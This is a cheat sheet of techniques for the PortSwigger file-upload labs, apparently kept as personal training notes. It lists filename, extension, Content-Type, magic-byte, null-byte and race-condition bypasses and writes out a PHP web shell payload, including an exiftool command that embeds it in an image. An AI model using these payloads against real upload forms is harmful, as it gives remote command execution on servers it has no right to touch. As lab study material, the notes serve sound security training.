# PortSwigger File Upload Labs — Complete Reference

## Categories (8 labs)
1. **Web shell upload (simple)** — Upload PHP, access `/files/shell.php`
2. **Web shell via Content-Type bypass** — Change `Content-Type: image/jpeg`
3. **Web shell via path traversal** — `filename="../shell.php"` or `..%2f`
4. **Web shell via extension blacklist** — Use `.php5`, `.phtm`, `.phtml`, `.phar`
5. **Web shell via magic bytes** — Add `GIF89a` prefix (PHP still executes)
6. **Web shell via polyglot image** — Embed PHP in EXIF: `exiftool -Comment="<?php system($_GET['cmd']);?>" img.jpg`
7. **Web shell via race condition** — Upload + concurrent GET before validation deletes
8. **Web shell via obfuscated extension** — `file.php%00.jpg`, `file.php.;.jpg`, `file.php.jpg`

## Key Techniques
- `GIF89a<?php system($_GET['cmd']); ?>` — magic byte bypass
- `filename="..%2f..%2f..%2fvar/www/html/shell.php"` — URL-encoded traversal
- `filename="shell.php%00.jpg"` — null byte truncation
- `Content-Type: image/gif` with `filename="shell.php"`
